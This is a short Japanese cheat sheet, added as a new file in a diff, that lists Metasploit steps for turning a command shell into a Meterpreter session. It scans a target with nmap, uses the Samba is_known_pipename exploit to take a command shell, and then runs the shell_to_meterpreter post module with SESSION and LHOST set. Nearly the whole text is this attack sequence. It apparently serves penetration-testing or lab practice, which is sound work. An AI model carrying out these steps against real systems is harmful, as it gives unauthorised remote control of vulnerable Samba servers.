@@ -1,0 +1,13 @@
+cmdをmeterpreterにアップグレードする
+1) nmap
+2) msfconsole
+3) search samba
+4) use exploit/linux/samba/is_known_pipename
+5) set RHOST
+6) exploitでコマンドシェルを奪う
+7) Ctrl+zでmsfconsoleに戻る
+8) search shell_to_meterpreter
+9) use post/multi/manage/shell_to_meterpreter
+10) set SESSION 1とLHOSTを設定する
+11) run
+12) sessionsで一覧表示して、sessions -i でupgradeする
